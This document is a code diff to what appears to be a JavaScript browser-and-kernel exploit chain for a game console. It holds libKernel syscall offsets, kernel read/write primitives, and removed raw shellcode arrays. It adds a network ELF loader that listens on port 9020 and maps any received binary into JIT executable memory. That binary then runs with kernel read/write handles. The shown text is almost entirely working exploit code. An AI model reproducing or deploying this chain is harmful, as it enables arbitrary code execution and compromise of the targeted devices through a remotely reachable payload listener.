@@ -755,24 +755,28 @@ function stage2() {
   //alert("before syscalls");
 
 //0.85.070
-  window.syscalls[3] = 		window.libKernelBase.add32(0x322d0);//write
+  window.syscalls[3] = 		window.libKernelBase.add32(0x322d0);//read
   window.syscalls[4] = 		window.libKernelBase.add32(0x30c90);//write
   window.syscalls[5] = 		window.libKernelBase.add32(0x300d0);//open
   window.syscalls[20] = 	window.libKernelBase.add32(0x31c30);//getpid
   window.syscalls[23] = 	window.libKernelBase.add32(0x2fd50);//setuid
   window.syscalls[24] = 	window.libKernelBase.add32(0x31070); // sys_getuid
+  window.syscalls[0x01E] =  window.libKernelBase.add32(0x2fc20); // sys_accept
   window.syscalls[54] = 	window.libKernelBase.add32(0x30110);//ioctl
   window.syscalls[74] = 	window.libKernelBase.add32(0x30660);//mprotect
   window.syscalls[97] = 	window.libKernelBase.add32(0x32100);//socket
   window.syscalls[98] = 	window.libKernelBase.add32(0x303b0);//connect
+  window.syscalls[0x068] = 	window.libKernelBase.add32(0x30960); // sys_bind
+  window.syscalls[0x06A] =  window.libKernelBase.add32(0x30820); // sys_listen
   window.syscalls[105] = 	window.libKernelBase.add32(0x2fff0);//setsockopt
   window.syscalls[118] = 	window.libKernelBase.add32(0x30250);//getsockopt
   window.syscalls[324] = 	window.libKernelBase.add32(0x32350);//mlockall
   window.syscalls[477] = 	window.libKernelBase.add32(0x2ffd0);//mmap
   window.syscalls[533] = 	window.libKernelBase.add32(0x32310);//jitshm_create
   window.syscalls[534] = 	window.libKernelBase.add32(0x322f0);//jitshm_alias
-  window.syscalls[585]  = 	window.libKernelBase.add32(0x2fb60); //sys_is_in_sandbox
+  window.syscalls[585] = 	window.libKernelBase.add32(0x2fb60); //sys_is_in_sandbox
   window.syscalls[687] = 	window.libKernelBase.add32(0x31fc0);//pipe2
+  window.syscalls[0x24F] =  window.libKernelBase.add32(0x30070); // sys_dynlib_dlsym
   //alert("after syscalls");
 
   p.write8(kstr, orig_kview_buf);
@@ -786,83 +790,7 @@ function stage2() {
       alert(e);
     }
   } 
-    //alert("after stage 3");
- var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
-    var payload_loader = p.malloc32(0x1000);
-
-    var loader_writer = payload_loader.backing;
-    loader_writer[0] = 0x56415741;
-    loader_writer[1] = 0x83485541;
-    loader_writer[2] = 0x894818EC;
-    loader_writer[3] = 0xC748243C;
-    loader_writer[4] = 0x10082444;
-    loader_writer[5] = 0x483C2302;
-    loader_writer[6] = 0x102444C7;
-    loader_writer[7] = 0x00000000;
-    loader_writer[8] = 0x000002BF;
-    loader_writer[9] = 0x0001BE00;
-    loader_writer[10] = 0xD2310000;
-    loader_writer[11] = 0x00009CE8;
-    loader_writer[12] = 0xC7894100;
-    loader_writer[13] = 0x8D48C789;
-    loader_writer[14] = 0xBA082474;
-    loader_writer[15] = 0x00000010;
-    loader_writer[16] = 0x000095E8;
-    loader_writer[17] = 0xFF894400;
-    loader_writer[18] = 0x000001BE;
-    loader_writer[19] = 0x0095E800;
-    loader_writer[20] = 0x89440000;
-    loader_writer[21] = 0x31F631FF;
-    loader_writer[22] = 0x0062E8D2;
-    loader_writer[23] = 0x89410000;
-    loader_writer[24] = 0x2C8B4CC6;
-    loader_writer[25] = 0x45C64124;
-    loader_writer[26] = 0x05EBC300;
-    loader_writer[27] = 0x01499848;
-    loader_writer[28] = 0xF78944C5;
-    loader_writer[29] = 0xBAEE894C;
-    loader_writer[30] = 0x00001000;
-    loader_writer[31] = 0x000025E8;
-    loader_writer[32] = 0x7FC08500;
-    loader_writer[33] = 0xFF8944E7;
-    loader_writer[34] = 0x000026E8;
-    loader_writer[35] = 0xF7894400;
-    loader_writer[36] = 0x00001EE8;
-    loader_writer[37] = 0x2414FF00;
-    loader_writer[38] = 0x18C48348;
-    loader_writer[39] = 0x5E415D41;
-    loader_writer[40] = 0x31485F41;
-    loader_writer[41] = 0xC748C3C0;
-    loader_writer[42] = 0x000003C0;
-    loader_writer[43] = 0xCA894900;
-    loader_writer[44] = 0x48C3050F;
-    loader_writer[45] = 0x0006C0C7;
-    loader_writer[46] = 0x89490000;
-    loader_writer[47] = 0xC3050FCA;
-    loader_writer[48] = 0x1EC0C748;
-    loader_writer[49] = 0x49000000;
-    loader_writer[50] = 0x050FCA89;
-    loader_writer[51] = 0xC0C748C3;
-    loader_writer[52] = 0x00000061;
-    loader_writer[53] = 0x0FCA8949;
-    loader_writer[54] = 0xC748C305;
-    loader_writer[55] = 0x000068C0;
-    loader_writer[56] = 0xCA894900;
-    loader_writer[57] = 0x48C3050F;
-    loader_writer[58] = 0x006AC0C7;
-    loader_writer[59] = 0x89490000;
-    loader_writer[60] = 0xC3050FCA;
-
-    chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
-
-    var loader_thr = chain.spawn_thread("loader_thr", function (new_thr) {
-      new_thr.push(window.gadgets["pop rdi"]);
-      new_thr.push(payload_buffer);
-      new_thr.push(payload_loader);
-      new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);
-    });
-    loader_thr();
-    alert("waiting for payload");
+    
   
 }
 
@@ -905,6 +833,7 @@ function stage3() {
   const NUM_SLAVE_SOCKS = 300;
   
   let dump_sock_fd = chain.syscall(0x061, AF_INET, SOCK_STREAM, 0);
+  let elf_loader_sock_fd = chain.syscall(97, AF_INET, SOCK_STREAM, 0).low << 0;
   //alert("opened dump sock=0x" + dump_sock_fd);
   
     // Create pipe pair and ultimate r/w prims
@@ -1549,138 +1478,313 @@ function stage3() {
 	
 	debug_log("uid_is_set: 0x" + uid_is_set.low);
 
-    var exec_handle = chain.syscall(533, 0, 0x100000, 7);
-	var write_handle = chain.syscall(534, exec_handle, 3);
-	var write_address = chain.syscall(477, new int64(0x91000000, 0x9), 0x100000, 3, 17, write_handle, 0);
-	var exec_address = chain.syscall(477, new int64(0x90000000, 0x9), 0x100000, 0x5, 1, exec_handle, 0)
-	chain.syscall(324, 1);
-	if(exec_address.low != 0x90000000) {
-	  alert("[ERROR] failed to allocate jit memory REBOOT");
-	  while(1){};
-	}
+     ///////////////////////////////////////////////////////////////////////
+    // Stage 6: loader
+    ///////////////////////////////////////////////////////////////////////
+
+    let dlsym_addr = syscalls[0x24F];
+    let jit_handle_store = p.malloc(0x4);
+    let test_store_buf   = p.malloc(0x4);
+
+    // ELF sizes and offsets
+    let SIZE_ELF_HEADER = 0x40;
+    let SIZE_ELF_PROGRAM_HEADER = 0x38;
+
+    let OFFSET_ELF_HEADER_ENTRY = 0x18;
+    let OFFSET_ELF_HEADER_PHOFF = 0x20;
+    let OFFSET_ELF_HEADER_PHNUM = 0x38;
+
+    let OFFSET_PROGRAM_HEADER_TYPE = 0x00;
+    let OFFSET_PROGRAM_HEADER_FLAGS = 0x04;
+    let OFFSET_PROGRAM_HEADER_OFFSET = 0x08;
+    let OFFSET_PROGRAM_HEADER_VADDR = 0x10;
+    let OFFSET_PROGRAM_HEADER_MEMSZ = 0x28;
+
+    let OFFSET_RELA_OFFSET = 0x00;
+    let OFFSET_RELA_INFO = 0x08;
+    let OFFSET_RELA_ADDEND = 0x10;
+
+    // ELF program header types
+    let ELF_PT_LOAD = 0x01;
+    let ELF_PT_DYNAMIC = 0x02;
+
+    // ELF dynamic table types
+    let ELF_DT_NULL = 0x00;
+    let ELF_DT_RELA = 0x07;
+    let ELF_DT_RELASZ = 0x08;
+    let ELF_DT_RELAENT = 0x09;
+    let ELF_R_AMD64_RELATIVE = 0x08;
+
+    // ELF parsing
+    let conn_ret_store = p.malloc(0x8);
+
+    let elf_store_size = SIZE_ELF_HEADER + (SIZE_ELF_PROGRAM_HEADER * 0x10) + 0x1000000;
+    let elf_store = p.malloc(elf_store_size);
+
+    let shadow_mapping_addr = new int64(0x20100000, 0x00000009);
+    let mapping_addr = new int64(0x26100000, 0x00000009);
+
+    let elf_program_headers_offset = 0;
+    let elf_program_headers_num = 0;
 	
-	var exec_writer = p.array_from_address(write_address, 0x4000);
-	for(var i = 0; i < 0x200; i++) {
-		exec_writer[i] = 0x90909090;
-	}
-	exec_writer[0x200] = 0x37C0C748;
-	exec_writer[0x201] = 0xC3000013;
-	if(chain.call(exec_address).low != 0x1337) {
-		alert("[ERROR] hmm weird REBOOT");
-		while(1){};
-	}
+	async function parse_elf_store(total_sz = -1) {
+        // Parse header
+        // These are global variables
+        elf_program_headers_offset = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHOFF));
+        elf_program_headers_num = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHNUM)) & 0xFFFF;
+        elf_entry_point = p.read4(elf_store.add32(OFFSET_ELF_HEADER_ENTRY));
 
-	/*
-	exec_writer[0] = 0x54415355;
-  exec_writer[1] = 0x1111BB48;
-  exec_writer[2] = 0x11111111;
-  exec_writer[3] = 0xBD481111;
-  exec_writer[4] = 0x22222222;
-  exec_writer[5] = 0x22222222;
-  exec_writer[6] = 0xBFE4314D;
-  exec_writer[7] = 0x000000C0;
-  exec_writer[8] = 0xBADE8948;
-  exec_writer[9] = 0x00000002;
-  exec_writer[10] = 0x8349D5FF;
-  exec_writer[11] = 0x814901C4;
-  exec_writer[12] = 0x000500FC;
-  exec_writer[13] = 0x41E47500;
-  exec_writer[14] = 0x655D5B5C;
-  exec_writer[15] = 0x25048B48;
-  exec_writer[16] = 0x00000000;
-  exec_writer[17] = 0x08408B48;
-  exec_writer[18] = 0x48408B48;
-  exec_writer[19] = 0x48008B48;
-  exec_writer[20] = 0x333333B9;
-  exec_writer[21] = 0x33333333;
-  exec_writer[22] = 0xC7C74833;
-  exec_writer[23] = 0x000002BE; // num sockets
-  exec_writer[24] = 0x48F63148;
-  exec_writer[25] = 0x117DFE39;
-  exec_writer[26] = 0x48B1148B;
-  exec_writer[27] = 0x00D004C7;
-  exec_writer[28] = 0x48000000;
-  exec_writer[29] = 0xEB01C683;
-  exec_writer[30] = 0x44BF48EA;
-  exec_writer[31] = 0x44444444;
-  exec_writer[32] = 0x48444444;
-  exec_writer[33] = 0x555555BE;
-  exec_writer[34] = 0x55555555;
-  exec_writer[35] = 0x37894855;
-  exec_writer[36] = 0x6666BF48;
-  exec_writer[37] = 0x66666666;
-  exec_writer[38] = 0x200F6666;
-  exec_writer[39] = 0xFF2548C0;
-  exec_writer[40] = 0x0FFFFEFF;
-  exec_writer[41] = 0x87C6C022;
-  exec_writer[42] = 0x0063A160;
-  exec_writer[43] = 0xC087C7C3;
-  exec_writer[44] = 0x480063AC;
-  exec_writer[45] = 0xC7C3C031;
-  exec_writer[46] = 0x639F1087;
-  exec_writer[47] = 0xC0314800;
-  exec_writer[48] = 0xE087C7C3;
-  exec_writer[49] = 0x480063A6;
-  exec_writer[50] = 0xC6C3C031;
-  exec_writer[51] = 0x67B5C087;
-  exec_writer[52] = 0xBE480002;
-  exec_writer[53] = 0x90909090;
-  exec_writer[54] = 0x8B499090;
-  exec_writer[55] = 0x08B78948;
-  exec_writer[56] = 0xC700264C;
-  exec_writer[57] = 0x087B7087;
-  exec_writer[58] = 0x0000B800;
-  exec_writer[59] = 0x9087C700;
-  exec_writer[60] = 0x00000004;
-  exec_writer[61] = 0x66000000;
-  exec_writer[62] = 0x04B987C7;
-  exec_writer[63] = 0x90900000;
-  exec_writer[64] = 0xBD87C766;
-  exec_writer[65] = 0x90000004;
-  exec_writer[66] = 0x87C76690;
-  exec_writer[67] = 0x000004C6;
-  exec_writer[68] = 0x87C6E990;
-  exec_writer[69] = 0x001D2336;
-  exec_writer[70] = 0x3987C637;
-  exec_writer[71] = 0x37001D23;
-  exec_writer[72] = 0xC187C766;
-  exec_writer[73] = 0x9000094E;
-  exec_writer[74] = 0x87C766E9;
-  exec_writer[75] = 0x0009547B;
-  exec_writer[76] = 0x87C7E990;
-  exec_writer[77] = 0x002F2C20;
-  exec_writer[78] = 0xC3C03148;
-  exec_writer[79] = 0x7087C748;
-  exec_writer[80] = 0x02011258;
-  exec_writer[81] = 0x48000000;
-  exec_writer[82] = 0xB192B78D;
-  exec_writer[83] = 0x89480006;
-  exec_writer[84] = 0x125878B7;
-  exec_writer[85] = 0x9C87C701;
-  exec_writer[86] = 0x01011258;
-  exec_writer[87] = 0x48000000;
-  exec_writer[88] = 0x0100000D;
-  exec_writer[89] = 0xC0220F00;
-  exec_writer[90] = 0x8080B848;
-  exec_writer[91] = 0x80808080;
-  exec_writer[92] = 0x90C38080;
+        if (elf_program_headers_offset != 0x40) {
+            debug_log("[!] ELF header malformed, terminating connection.");
+            throw new Error("ELF header malformed, terminating connection.");
+        }
 
-  p.write8(write_address.add32(0x6), kernel_base.add32(KERNEL_M_IP6OPT_OFFSET));
-  p.write8(write_address.add32(0x10), kernel_base.add32(KERNEL_MALLOC_OFFSET));
-  p.write8(write_address.add32(0x51), fix_these_sockets_ptr);
+        //debug_log("[+] parsing ELF file (" + total_sz.toString(10) + " bytes)...");
 
-  p.write8(write_address.add32(0x7B), target_file.add32(FILE_FOPS_OFFSET));
-  p.write8(write_address.add32(0x85), socketops);
-  p.write8(write_address.add32(0x92), kernel_base);
+        let text_segment_sz = 0;
+        let data_segment_sz = 0;
+        let rela_table_offset = 0;
+        let rela_table_count = 0;
+        let rela_table_size = 0;
+        let rela_table_entsize = 0;
+        let shadow_write_mapping = 0;
 
-  p.write8(fake_socketops.add32(FILEOPS_IOCTL_OFFSET), exec_address);
-  kernel_write8(target_file.add32(FILE_FOPS_OFFSET), fake_socketops);
-  chain.syscall(54, target_socket, 0x20001111, 0);
-	*/
-  
-  //alert("executed in kernel");
-  //p.write8(0, 0);
-  
+        // Parse program headers and map segments
+        for (let i = 0; i < elf_program_headers_num; i++) {
+            let program_header_offset = elf_program_headers_offset + (i * SIZE_ELF_PROGRAM_HEADER);
+
+            let program_type = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_TYPE));
+            let program_flags = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_FLAGS));
+            let program_offset = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_OFFSET));
+            let program_vaddr = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_VADDR));
+            let program_memsz = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_MEMSZ));
+            let aligned_memsz = (program_memsz + 0x3FFF) & 0xFFFFC000;
+
+            if (program_type == ELF_PT_LOAD) {
+                // For executable segments, we need to take some care and do alias'd mappings.
+                // Also, the mapping size is fixed at 0x100000. This is because jitshm requires to be aligned this way... for some dumb reason.
+                if ((program_flags & 1) == 1) {
+                    // Executable segment
+                    text_segment_sz = program_memsz;
+
+                    // Get exec
+                    jit_handle_store = chain.syscall(533, 0x0, aligned_memsz, 0x7);
+                    chain.run();
+                    let exec_handle = p.read4(jit_handle_store);
+
+                    // Get write alias
+                    jit_handle_store = chain.syscall(534, exec_handle, 0x3);
+                    chain.run();
+                    let write_handle = p.read4(jit_handle_store);
+
+                    // Map to shadow mapping
+                    conn_ret_store = chain.syscall(477, shadow_mapping_addr, aligned_memsz, 0x3, 0x11, write_handle, 0);
+                    chain.run();
+                    shadow_write_mapping = p.read8(conn_ret_store);
+
+                    // Copy in segment data
+                    let dest = p.read8(conn_ret_store);
+                    for (let j = 0; j < program_memsz; j += 0x8) {
+                        let src_qword = p.read8(elf_store.add32(program_offset + j));
+                        p.write8(dest.add32(j), src_qword);
+                    }
+
+                    // Map executable segment
+                    conn_ret_store = chain.syscall(477, mapping_addr.add32(program_vaddr), aligned_memsz, 0x5, 0x11, exec_handle, 0);
+                    chain.run();
+                } else {
+                    // Regular data segment
+                    data_mapping_addr = mapping_addr.add32(program_vaddr);
+                    data_segment_sz = aligned_memsz;
+
+                    conn_ret_store = chain.syscall(477, mapping_addr.add32(program_vaddr), aligned_memsz, 0x3, 0x1012, 0xFFFFFFFF, 0);
+                    chain.run();
+
+                    // Copy in segment data
+                    let dest = mapping_addr.add32(program_vaddr);
+                    for (let j = 0; j < program_memsz; j += 0x8) {
+                        let src_qword = p.read8(elf_store.add32(program_offset + j));
+                        p.write8(dest.add32(j), src_qword);
+                    }
+                }
+            }
+
+            if (program_type == ELF_PT_DYNAMIC) {
+                // Parse dynamic tags, the ones we truly care about are rela-related.
+                for (let j = 0x00; ; j += 0x10) {
+                    let d_tag = p.read8(elf_store.add32(program_offset + j)).low;
+                    let d_val = p.read8(elf_store.add32(program_offset + j + 0x08));
+
+                    // DT_NULL means we reached the end of the table
+                    if (d_tag == ELF_DT_NULL || j > 0x100) {
+                        break;
+                    }
+
+                    switch (d_tag) {
+                        case ELF_DT_RELA:
+                            rela_table_offset = d_val.low;
+                            break;
+                        case ELF_DT_RELASZ:
+                            rela_table_size = d_val.low;
+                            break;
+                        case ELF_DT_RELAENT:
+                            rela_table_entsize = d_val.low;
+                            break;
+                    }
+                }
+            }
+        }
+
+        // Process relocations if they exist
+        if (rela_table_offset != 0) {
+            let base_address = 0x1000;
+
+            // The rela table offset from dynamic table is relative to the LOAD segment offset not file offset.
+            // The linker script should guarantee it ends up in the first LOAD segment (code).
+            rela_table_offset += base_address;
+
+            // Rela count can be gotten from dividing the table size by entry size
+            rela_table_count = rela_table_size / rela_table_entsize;
+
+            // Parse relocs and apply them
+            for (let i = 0; i < rela_table_count; i++) {
+                let r_offset = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
+                    OFFSET_RELA_OFFSET));
+                let r_info = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
+                    OFFSET_RELA_INFO));
+                let r_addend = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
+                    OFFSET_RELA_ADDEND));
+
+                let reloc_addr = mapping_addr.add32(r_offset.low);
+
+                // If the relocation falls in the executable section, we need to redirect the write to the
+                // writable shadow mapping or we'll crash
+                if (r_offset.low <= text_segment_sz) {
+                    reloc_addr = shadow_write_mapping.add32(r_offset.low);
+                }
+
+                if ((r_info.low & 0xFF) == ELF_R_AMD64_RELATIVE) {
+                    let reloc_value = mapping_addr.add32(r_addend.low); // B + A
+                    p.write8(reloc_addr, reloc_value);
+                }
+            }
+        }
+
+    }
+	// reuse these plus we can more easily access them
+    let rwpair_mem = p.malloc(0x8);
+    let test_payload_store = p.malloc(0x8);
+    let pthread_handle_store = p.malloc(0x8);
+    let pthread_value_store = p.malloc(0x8);
+    let args = p.malloc(0x8 * 6);
+
+    async function execute_elf_store() {
+        // zero out the buffers defined above
+        p.write8(rwpair_mem, 0);
+        p.write8(rwpair_mem.add32(0x4), 0);
+        p.write8(test_payload_store, 0);
+        p.write8(pthread_handle_store, 0);
+        p.write8(pthread_value_store, 0);
+        for (let i = 0; i < 0x8 * 6; i++) {
+            p.write1(args.add32(i), 0);
+        }
+
+        // Pass master/victim pair to payload so it can do read/write
+        p.write4(rwpair_mem.add32(0x00), master_sock);
+        p.write4(rwpair_mem.add32(0x04), victim_sock);
+
+        // Arguments to entrypoint
+        p.write8(args.add32(0x00), dlsym_addr);         // arg1 = dlsym_t* dlsym
+        p.write8(args.add32(0x08), pipe_mem);           // arg2 = int *rwpipe[2]
+        p.write8(args.add32(0x10), rwpair_mem);         // arg3 = int *rwpair[2]
+        p.write8(args.add32(0x18), pipe_addr);          // arg4 = uint64_t kpipe_addr
+        p.write8(args.add32(0x20), kdata_base);         // arg5 = uint64_t kdata_base_addr
+        p.write8(args.add32(0x28), test_payload_store); // arg6 = int *payloadout
+        // Execute payload in pthread
+        //debug_log("  [+] executing!");
+        chain.call(libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, mapping_addr.add32(elf_entry_point), args, p.stringify("payload"));
+
+    }
+	
+	async function wait_for_elf_to_exit() {
+        // Join pthread and wait until we're finished executing
+        chain.call(libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
+        debug_log("  [+] finished, out = 0x" + p.read8(test_payload_store).toString(16));
+
+        // debug_log("[+] Done.");
+    }
+
+    async function load_local_elf(filename) {
+        try {
+            let total_sz = load_payload_into_elf_store_from_local_file(filename);
+            parse_elf_store(total_sz);
+            execute_elf_store();
+            wait_for_elf_to_exit();
+        } catch (error) {
+            debug_log("[!] failed to load local elf: " + error);
+        }
+    }
+	
+	let ELF_LOADER_PORT = 9020;
+    let ELF_LOADER_NET_PORT = htons(ELF_LOADER_PORT);
+
+    debug_log("Launching ELF loader (port :" + ELF_LOADER_PORT.toString(10) + ")");
+
+    // ELF Loader
+    let elf_loader_sock_addr_store = p.malloc(0x10);
+
+    
+
+    for (let i = 0; i < 0x10; i += 0x8) {
+        p.write8(elf_loader_sock_addr_store.add32(i), 0);
+    }
+
+    let INADDR_ANY = 0;
+    build_addr(elf_loader_sock_addr_store, AF_INET, ELF_LOADER_NET_PORT, INADDR_ANY);
+
+    // Establish a server
+    let res = chain.syscall(0x68, elf_loader_sock_fd, elf_loader_sock_addr_store, 0x10).low << 0;
+    if (res < 0) {
+        throw new Error("Failed to bind ELF loader socket");
+    }
+
+    res = chain.syscall(0x6A, elf_loader_sock_fd, 5).low << 0;
+    if (res < 0) {
+        throw new Error("Failed to listen on ELF loader socket");
+    }
+	
+	// Accept clients
+    let conn_addr_store = p.malloc(0x10);
+    let conn_addr_sz_store = p.malloc(0x4);
+
+    p.write4(conn_addr_sz_store, 0x10);
+
+	alert("about to enter elf loader stage");
+
+    for (; ;) {
+        let conn_fd = chain.syscall(0x1E, elf_loader_sock_fd, conn_addr_store, conn_addr_sz_store).low << 0;
+
+        // Got a connection, read all we can
+        let write_ptr = elf_store.add32(0x0);
+        let total_sz = 0;
+        for (; ;) {
+            let conn_ret = chain.syscall(3, conn_fd, write_ptr, elf_store_size - total_sz).low << 0;
+            if (conn_ret <= 0) {
+                break;
+            }
+            write_ptr.add32inplace(conn_ret);
+            total_sz += conn_ret;
+        }
+
+        try {
+            debug_log("Executing ELF...");
+            parse_elf_store();
+            execute_elf_store();
+            wait_for_elf_to_exit();
+        } catch (error) {
+            debug_log(`Error executing ELF: ${error}`);
+        }
+    }
 }
 
 const stack_sz = 0x40000;
